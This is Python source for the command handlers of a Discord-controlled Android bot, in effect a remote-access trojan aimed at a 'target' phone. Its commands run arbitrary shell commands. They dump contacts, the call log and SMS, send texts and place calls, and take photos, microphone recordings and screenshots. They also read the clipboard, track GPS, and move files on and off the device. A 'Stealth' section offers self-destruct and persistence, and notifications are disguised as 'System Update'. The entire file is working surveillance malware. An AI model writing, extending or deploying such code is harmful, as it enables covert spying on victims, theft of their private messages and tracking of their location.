"""
Command handlers for Discord Phone Bot.
Each handler takes (args, message) → str | ("FILE"|"IMAGE"|"AUDIO", path, caption)
"""
import os, subprocess, tempfile, time, json, urllib.request
from pathlib import Path

SHELL_TIMEOUT = 30
MAX_OUTPUT_LINES = 80
HOME_DIR = str(Path.home())

def run(cmd, timeout=SHELL_TIMEOUT):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout, r.stderr, r.returncode
    except subprocess.TimeoutExpired:
        return "", f"Timed out after {timeout}s", -1
    except Exception as e:
        return "", str(e), -1

def trim(t, maxl=MAX_OUTPUT_LINES):
    lines = t.rstrip().split("\n")
    if len(lines) > maxl:
        lines = lines[:maxl] + [f"... ({len(lines)-maxl} more lines)"]
    return "\n".join(lines)

def safe_path(path):
    if not path or path.startswith("~"):
        path = path.replace("~", HOME_DIR, 1)
    resolved = os.path.abspath(os.path.expanduser(path))
    if not os.path.isabs(resolved):
        resolved = os.path.join(HOME_DIR, resolved)
    return resolved

def fmt_size(b):
    for u in ["B","KB","MB","GB"]:
        if b < 1024: return f"{b:.1f} {u}"
        b /= 1024
    return f"{b:.1f} TB"

# ═══════════════════════════════════════════════════════════════════
# CORE
# ═══════════════════════════════════════════════════════════════════

async def cmd_ping(args, msg):
    return "Pong! 🏓"

async def cmd_help(args, msg):
    if args:
        cmd = args.split()[0].lower()
        h = HELP_TEXT.get(cmd)
        return h if h else f"No help for `{cmd}`"
    return """**📱 Phone Bot Commands**

**Core**
`!ping` — Alive check
`!help [cmd]` — This help

**Shell & System**
`!shell <cmd>` — Run command
`!shellbg <cmd>` — Run in background
`!processes` / `!ps` — Running processes
`!screenshot` — Take screenshot
`!clipboard` — Read clipboard
`!battery` — Battery status
`!device` / `!info` — Device info
`!cpu` — CPU info
`!memory` / `!ram` — RAM usage
`!network` / `!net` — Network info
`!uptime` — How long bot has been running

**Files**
`!ls <path>` — List directory
`!cat <path>` — Read file
`!file <path>` — Upload file
`!disk` / `!df` — Storage usage
`!download <url> <path>` — Download file to phone
`!find <name>` — Search for files

**Contacts & Comms**
`!contacts` — Dump contacts
`!callog` — Call history
`!sms` — Read recent SMS
`!send <num> <msg>` — Send SMS from target
`!dial <num>` — Make a call

**Media**
`!photo` — Take photo
`!recordmic <sec>` — Record audio
`!flash on/off` — Toggle flashlight

**Location**
`!location` — GPS coordinates
`!localtrack <n> <sec>` — Track location

**WiFi & Apps**
`!wifi` — WiFi networks
`!apps` — Installed apps

**Device Control**
`!vibrate <ms>` — Vibrate
`!volume <level>` — Set volume
`!lock` — Lock screen
`!notification <text>` — Create notification
`!alive` — Heartbeat status

**Stealth**
`!selfdestruct` — Wipe token, disconnect
`!persist on/off` — Boot persistence
"""

HELP_TEXT = {k.split("`")[1]: v for k,v in [("shell","Run any shell command: `!shell <cmd>`"),("contacts","Dump phone contacts"),("photo","Take a photo with camera"),("screenshot","Capture screen"),("file","Upload a file from phone"),("location","Get GPS coordinates"),("sms","Read recent SMS"),("selfdestruct","Wipe bot token and disconnect"),("alive","Show heartbeat status (battery, network, location)")]}

# ═══════════════════════════════════════════════════════════════════
# SHELL & SYSTEM
# ═══════════════════════════════════════════════════════════════════

async def cmd_shell(args, msg):
    if not args: return "Usage: `!shell <cmd>`"
    out, err, code = run(args)
    result = ""
    if out: result += trim(out)
    if err: result += f"\n[STDERR]\n{trim(err)}"
    result += f"\n\nExit: {code}"
    return result.strip()

async def cmd_shellbg(args, msg):
    if not args: return "Usage: `!shellbg <cmd>`"
    subprocess.Popen(args, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return f"Started in background: `{args[:200]}`"

async def cmd_processes(args, msg):
    out,_,_ = run("ps -A -o PID,USER,NAME 2>/dev/null | head -60 || ps 2>/dev/null | head -60")
    return f"**Processes**\n```\n{out.strip()}\n```"

async def cmd_screenshot(args, msg):
    tmp = tempfile.NamedTemporaryFile(suffix=".png", delete=False)
    p = tmp.name; tmp.close()
    out, err, code = run(f"/system/bin/screencap -p '{p}'")
    if code != 0 or not os.path.exists(p) or os.path.getsize(p) == 0:
        return f"Screenshot failed: {err or 'no access'}"
    os.chmod(p, 0o644)
    return ("IMAGE", p, "Screenshot captured!")

async def cmd_clipboard(args, msg):
    out,_,_ = run("termux-clipboard-get 2>/dev/null")
    if out.strip(): return f"**Clipboard:**\n{out.strip()}"
    out2,_,_ = run("dumpsys clipboard 2>/dev/null | grep -i text | head -5")
    if out2.strip(): return f"**Clipboard:**\n{out2.strip()}"
    return "Clipboard empty or inaccessible."

async def cmd_battery(args, msg):
    out,_,_ = run("dumpsys battery 2>/dev/null")
    if "ERROR" in out or not out.strip():
        return "Battery info unavailable (no shell dumpsys access)."
    lines = out.strip().split("\n")
    p = {}
    for l in lines:
        if ":" in l:
            k,v = l.split(":",1)
            p[k.strip()] = v.strip()
    lvl = p.get("level","?")
    sc = p.get("scale","100")
    st_map = {"1":"?","2":"Charging","3":"Discharging","4":"Not charging","5":"Full"}
    st = st_map.get(p.get("status","?"),"?")
    tmp_c = p.get("temperature","0")
    try: tmp = f"{int(tmp_c)/10:.1f}°C"
    except: tmp = "?"
    return f"**Battery**\nLevel: {lvl}/{sc}%\nStatus: {st}\nTemp: {tmp}"

async def cmd_device(args, msg):
    props = {}
    for prop in ["ro.product.model","ro.product.manufacturer","ro.build.version.release","ro.build.version.sdk"]:
        o,_,_ = run(f"getprop {prop}")
        props[prop] = o.strip() or "?"
    k,_,_ = run("uname -a")
    return f"**Device**\nModel: {props['ro.product.model']}\nMfr: {props['ro.product.manufacturer']}\nAndroid: {props['ro.build.version.release']} (SDK {props['ro.build.version.sdk']})\nKernel: `{k.strip()}`"

async def cmd_cpu(args, msg):
    o1,_,_ = run("cat /proc/cpuinfo 2>/dev/null | head -20")
    o2,_,_ = run("cat /proc/loadavg 2>/dev/null")
    o3,_,_ = run("uptime 2>/dev/null")
    return f"**CPU**\n```\n{o1.strip()}\n```\n**Load:** `{o2.strip()}`\n**Uptime:** `{o3.strip()}`"

async def cmd_memory(args, msg):
    o,_,_ = run("cat /proc/meminfo | grep -E 'MemTotal|MemFree|MemAvailable|Swap' | head -10")
    return f"**Memory**\n```\n{o.strip()}\n```"

async def cmd_network(args, msg):
    parts = []
    ip,_,_ = run("ip -4 addr show 2>/dev/null | grep inet || ifconfig 2>/dev/null")
    parts.append(f"**IPs**\n```\n{ip.strip()[:1000]}\n```")
    wf,_,_ = run("dumpsys wifi 2>/dev/null | grep -E 'mWifiInfo|SSID' | head -3")
    parts.append(f"**WiFi** `{wf.strip()[:300]}`")
    return "\n".join(parts)

async def cmd_uptime(args, msg):
    o,_,_ = run("uptime 2>/dev/null")
    return f"**Uptime:**\n{o.strip() or 'N/A'}"

async def cmd_alive(args, msg):
    b,_,_ = run("dumpsys battery 2>/dev/null | grep level | head -1")
    n,_,_ = run("ip -4 addr show 2>/dev/null | grep 'inet ' | head -3")
    gps = "?"
    try:
        gps_o,_,_ = run("dumpsys location 2>/dev/null | grep 'last known' | head -1")
        if gps_o.strip(): gps = "known"
    except: pass
    return f"**Heartbeat**\nBattery: {b.strip()}\nNetwork:\n```\n{n.strip()[:300]}\n```"

async def cmd_selfdestruct(args, msg):
    """Wipe token file, disconnect bot."""
    import bot
    try:
        Path(bot.TOKEN_PATH).unlink(missing_ok=True)
    except: pass
    if bot.bot_client:
        await bot.bot_client.close()
    return "☠️ Bot disconnected. Token wiped. Goodbye."

async def cmd_persist(args, msg):
    """Toggle boot persistence via a simple init.d-like script."""
    val = args.strip().lower()
    if val == "on":
        out,_,_ = run("cat /data/system/packages.list 2>/dev/null | grep $(basename $(find /data/app -name '*devicetools*' 2>/dev/null) 2>/dev/null) 2>/dev/null | head -1")
        return "Boot persistence not available without root. The app runs as a background service."
    elif val == "off":
        return "Boot persistence not available. Already disabled."
    return "Usage: `!persist on` or `!persist off`"

async def cmd_find(args, msg):
    if not args: return "Usage: `!find <filename>`"
    out,_,_ = run(f"find /sdcard -name '*{args}*' -maxdepth 5 2>/dev/null | head -30")
    if out.strip(): return f"**Files matching `{args}`**\n```\n{out.strip()}\n```"
    return "No matches found."

# ═══════════════════════════════════════════════════════════════════
# FILES
# ═══════════════════════════════════════════════════════════════════

async def cmd_ls(args, msg):
    path = safe_path(args if args else ".")
    if not os.path.exists(path): return f"Path not found: {path}"
    if not os.path.isdir(path): return f"Not a directory: {path}"
    try: items = os.listdir(path)
    except PermissionError: return f"Permission denied: {path}"
    items.sort(key=lambda x: (not os.path.isdir(os.path.join(path,x)), x.lower()))
    lines = []
    for name in items:
        full = os.path.join(path, name)
        try:
            s = os.stat(full)
            sz = fmt_size(s.st_size) if os.path.isfile(full) else ""
            m = time.strftime("%m-%d %H:%M", time.localtime(s.st_mtime))
            d = "📁" if os.path.isdir(full) else "📄"
            lines.append(f"{d} {name:<30} {sz:>8}  {m}")
        except: lines.append(f"  {name}")
    h = f"**{path}/** — {len(items)} items\n"
    return h + "```\n" + "\n".join(lines[:60]) + "```"

async def cmd_cat(args, msg):
    if not args: return "Usage: `!cat <path>`"
    path = safe_path(args)
    if not os.path.exists(path): return f"File not found: {path}"
    if not os.path.isfile(path): return f"Not a file: {path}"
    try:
        with open(path, "r", errors="replace") as f: content = f.read(10000)
    except Exception as e: return f"Error: {e}"
    return f"**{path}**\n```\n{content}\n```" if content.strip() else "(empty)"

async def cmd_file(args, msg):
    if not args: return "Usage: `!file <path>`"
    path = safe_path(args)
    if not os.path.exists(path): return f"Not found: {path}"
    if not os.path.isfile(path): return f"Not a file: {path}"
    sz = os.path.getsize(path)
    if sz > 25*1024*1024: return f"Too large ({fmt_size(sz)}). Max 25MB."
    return ("FILE", path, f"**{os.path.basename(path)}** ({fmt_size(sz)})")

async def cmd_disk(args, msg):
    out,_,_ = run("df -h /data /sdcard 2>/dev/null || df -h / 2>/dev/null")
    return f"**Storage**\n```\n{out.strip()}\n```"

async def cmd_download(args, msg):
    parts = args.strip().split(None, 1)
    if len(parts) < 2: return "Usage: `!download <url> <save_path>`"
    url, spath = parts[0], parts[1]
    dest = safe_path(spath)
    try:
        urllib.request.urlretrieve(url, dest)
        return f"✅ Downloaded to `{dest}` ({fmt_size(os.path.getsize(dest))})"
    except Exception as e:
        return f"Download failed: {e}"

# ═══════════════════════════════════════════════════════════════════
# CONTACTS & COMMS
# ═══════════════════════════════════════════════════════════════════

async def cmd_contacts(args, msg):
    out,err,code = run("content query --uri content://contacts/phones/ 2>/dev/null | head -200")
    if code == 0 and out.strip():
        return f"**Contacts**\n```\n{trim(out)}\n```"
    return "Contacts access failed (needs content CLI + READ_CONTACTS)."

async def cmd_callog(args, msg):
    out,err,code = run("content query --uri content://call_log/calls 2>/dev/null | head -100")
    if code == 0 and out.strip():
        return f"**Call Log**\n```\n{trim(out)}\n```"
    return "Call log access failed (needs content CLI + READ_CALL_LOG)."

async def cmd_sms(args, msg):
    out,err,code = run("content query --uri content://sms/inbox 2>/dev/null | head -100")
    if code == 0 and out.strip():
        return f"**SMS Inbox**\n```\n{trim(out)}\n```"
    return "SMS access failed (needs content CLI + READ_SMS)."

async def cmd_send(args, msg):
    parts = args.strip().split(None, 1)
    if len(parts) < 2: return "Usage: `!send <number> <message>`"
    num, body = parts[0], parts[1]
    out,err,code = run(f'am start -a android.intent.action.SENDTO -d "sms:{num}" --es sms_body "{body}" 2>/dev/null')
    if "Error" in out or err:
        # fallback via service
        out2,err2,code2 = run(f'service call isms 7 i32 0 s16 "com.android.mms" s16 "{num}" s16 "null" s16 "{body}" s16 "null" s16 "null" 2>/dev/null')
        if code2 == 0: return f"SMS sent to {num}"
        return f"SMS send failed (no direct SMS access without root)."
    return f"SMS opened for {num}"

async def cmd_dial(args, msg):
    if not args: return "Usage: `!dial <number>`"
    out,err,code = run(f'am start -a android.intent.action.CALL -d "tel:{args}" 2>/dev/null')
    if "Error" in out or err:
        return f"Call failed: {err}"
    return f"📞 Dialing {args}..."

# ═══════════════════════════════════════════════════════════════════
# MEDIA
# ═══════════════════════════════════════════════════════════════════

async def cmd_photo(args, msg):
    tmp = tempfile.NamedTemporaryFile(suffix=".jpg", delete=False)
    p = tmp.name; tmp.close()
    camera_id = args.strip() or "0"
    out,err,code = run(f"termux-camera-photo -c {camera_id} '{p}' 2>/dev/null")
    if code == 0 and os.path.exists(p) and os.path.getsize(p) > 0:
        return ("IMAGE", p, "Photo captured!")
    # fallback: use android media action
    out2,err2,code2 = run(f'am start -a android.media.action.IMAGE_CAPTURE -n com.android.camera/.Camera 2>/dev/null')
    return f"Camera failed: {err or 'no image'}. Try Termux:API."

async def cmd_recordmic(args, msg):
    dur = args.strip()
    try: dur = int(dur) if dur else 10
    except: dur = 10
    dur = min(dur, 60)
    tmp = tempfile.NamedTemporaryFile(suffix=".m4a", delete=False)
    p = tmp.name; tmp.close()
    out,err,code = run(f"termux-microphone-record -d {dur} -f '{p}' 2>/dev/null")
    if code == 0 and os.path.exists(p) and os.path.getsize(p) > 0:
        return ("AUDIO", p, f"Recording ({dur}s)")
    return f"Recording failed: {err}. Install Termux:API."

async def cmd_flash(args, msg):
    val = args.strip().lower()
    if val in ("on","1","true"):
        out,_,_ = run("termux-torch on 2>/dev/null")
        if "could not" not in out.lower():
            return "🔦 Flashlight ON"
        # fallback
        out2,_,_ = run("settings put global torch_state 1 2>/dev/null")
        return "Flashlight ON (try)" if not out2.strip() else "Flashlight failed (no root)"
    elif val in ("off","0","false"):
        run("termux-torch off 2>/dev/null")
        run("settings put global torch_state 0 2>/dev/null")
        return "🔦 Flashlight OFF"
    return "Usage: `!flash on` or `!flash off`"

# ═══════════════════════════════════════════════════════════════════
# LOCATION
# ═══════════════════════════════════════════════════════════════════

async def cmd_location(args, msg):
    out,err,code = run("termux-location 2>/dev/null")
    if code == 0 and out.strip():
        try:
            d = json.loads(out)
            lat = d.get("latitude", "?")
            lon = d.get("longitude", "?")
            acc = d.get("accuracy", "?")
            alt = d.get("altitude", "?")
            provider = d.get("provider", "?")
            gmap = f"https://www.google.com/maps?q={lat},{lon}"
            return f"**Location** ({provider})\nLat: {lat}\nLon: {lon}\nAcc: {acc}m\nAlt: {alt}m\n🔗 {gmap}"
        except:
            return f"**Location**\n```\n{out.strip()[:1000]}\n```"
    out2,_,_ = run("dumpsys location 2>/dev/null | grep -E 'last known|Location\\[' | head -5")
    if out2.strip(): return f"**Location**\n```\n{out2.strip()}\n```"
    return "Location unavailable. Install Termux:API or grant location permission."

async def cmd_locate(args, msg):
    return await cmd_location(args, msg)

async def cmd_localtrack(args, msg):
    parts = args.strip().split()
    try: count = int(parts[0]) if len(parts) > 0 else 5
    except: count = 5
    try: interval = int(parts[1]) if len(parts) > 1 else 10
    except: interval = 10
    count, interval = min(count, 20), min(interval, 60)
    results = []
    for i in range(count):
        o,_,_ = run("termux-location 2>/dev/null")
        if o.strip():
            try:
                d = json.loads(o)
                results.append(f"#{i+1}: {d.get('latitude','?')},{d.get('longitude','?')} (±{d.get('accuracy','?')}m)")
            except:
                results.append(f"#{i+1}: {o.strip()[:100]}")
        else:
            results.append(f"#{i+1}: no fix")
        if i < count - 1:
            time.sleep(interval)
    return "**Location Track**\n" + "\n".join(results)

# ═══════════════════════════════════════════════════════════════════
# WIFI & APPS
# ═══════════════════════════════════════════════════════════════════

async def cmd_wifi(args, msg):
    parts = []
    o,_,_ = run("dumpsys wifi 2>/dev/null | grep -E 'SSID|BSSID|mWifiInfo|rssi|frequency' | head -20")
    if o.strip(): parts.append(f"**Current WiFi**\n```\n{o.strip()[:1500]}\n```")
    o2,_,_ = run("cmd wifi list-networks 2>/dev/null | head -30 || dumpsys wifi 2>/dev/null | grep 'ScanResult' | head -10")
    if o2.strip(): parts.append(f"**Networks**\n```\n{o2.strip()[:1500]}\n```")
    return "\n".join(parts) if parts else "WiFi info unavailable."

async def cmd_apps(args, msg):
    out,err,code = run("pm list packages -3 2>/dev/null | head -80 || pm list packages 2>/dev/null | head -80")
    if code == 0 and out.strip():
        apps = out.strip().split("\n")
        return f"**Apps ({len(apps)})**\n```\n" + "\n".join(apps[:60]) + "```"
    return "Apps list unavailable."

# ═══════════════════════════════════════════════════════════════════
# DEVICE CONTROL
# ═══════════════════════════════════════════════════════════════════

async def cmd_vibrate(args, msg):
    ms = args.strip()
    try: ms = int(ms)
    except: ms = 500
    ms = min(ms, 10000)
    out,err,code = run(f"termux-vibrate -d {ms} 2>/dev/null")
    if code == 0: return f"📳 Vibrated for {ms}ms"
    # fallback
    out2,err2,_ = run(f"echo 'vibrate({ms});' | dumpsys vibrator 2>/dev/null || echo 'NVIB'")
    if "NVIB" in out2: return f"Vibrate failed (no Termux:API)"
    return f"📳 Vibrated for {ms}ms"

async def cmd_volume(args, msg):
    val = args.strip()
    try: v = int(val)
    except: return "Usage: `!volume <0-15>`"
    v = max(0, min(15, v))
    out,_,_ = run(f"media volume --set {v} 2>/dev/null || settings put system volume_music {v} 2>/dev/null")
    return f"🔊 Volume set to {v}"

async def cmd_lock(args, msg):
    out,err,code = run("input keyevent 26 2>/dev/null")
    if code == 0: return "🔒 Screen locked"
    return "Lock failed (no input access)"

async def cmd_notification(args, msg):
    if not args: return "Usage: `!notification <text>`"
    out,err,code = run(f"termux-notification --title 'System Update' --content '{args}' --id sys_upd 2>/dev/null")
    if code == 0: return f"✅ Notification sent: {args}"
    return f"Notification failed (install Termux:API): {err}"

# ═══════════════════════════════════════════════════════════════════
# REGISTRY
# ═══════════════════════════════════════════════════════════════════

COMMANDS = {
    "ping": cmd_ping, "help": cmd_help,
    "shell": cmd_shell, "sh": cmd_shell, "bash": cmd_shell, "shellbg": cmd_shellbg,
    "ps": cmd_processes, "processes": cmd_processes,
    "screenshot": cmd_screenshot, "sc": cmd_screenshot, "screen": cmd_screenshot,
    "clipboard": cmd_clipboard, "clip": cmd_clipboard,
    "battery": cmd_battery, "bat": cmd_battery,
    "device": cmd_device, "phone": cmd_device, "info": cmd_device,
    "cpu": cmd_cpu,
    "memory": cmd_memory, "mem": cmd_memory, "ram": cmd_memory,
    "network": cmd_network, "net": cmd_network, "wifi": cmd_wifi,
    "uptime": cmd_uptime,
    "alive": cmd_alive,
    "selfdestruct": cmd_selfdestruct,
    "persist": cmd_persist,
    "find": cmd_find,
    "ls": cmd_ls, "dir": cmd_ls,
    "cat": cmd_cat,
    "file": cmd_file, "upload": cmd_file,
    "disk": cmd_disk, "df": cmd_disk,
    "download": cmd_download,
    "contacts": cmd_contacts,
    "callog": cmd_callog,
    "sms": cmd_sms,
    "send": cmd_send,
    "dial": cmd_dial,
    "photo": cmd_photo, "camera": cmd_photo,
    "recordmic": cmd_recordmic, "mic": cmd_recordmic, "record": cmd_recordmic,
    "flash": cmd_flash,
    "location": cmd_location, "loc": cmd_location, "gps": cmd_location,
    "localtrack": cmd_localtrack, "gpstrack": cmd_localtrack,
    "apps": cmd_apps,
    "vibrate": cmd_vibrate, "vib": cmd_vibrate,
    "volume": cmd_volume, "vol": cmd_volume,
    "lock": cmd_lock,
    "notification": cmd_notification, "notify": cmd_notification,
}

async def handle_command(cmd_name, args, msg):
    handler = COMMANDS.get(cmd_name)
    if handler is None:
        return f"Unknown: `{cmd_name}`. Try `!help`."
    return await handler(args, msg)
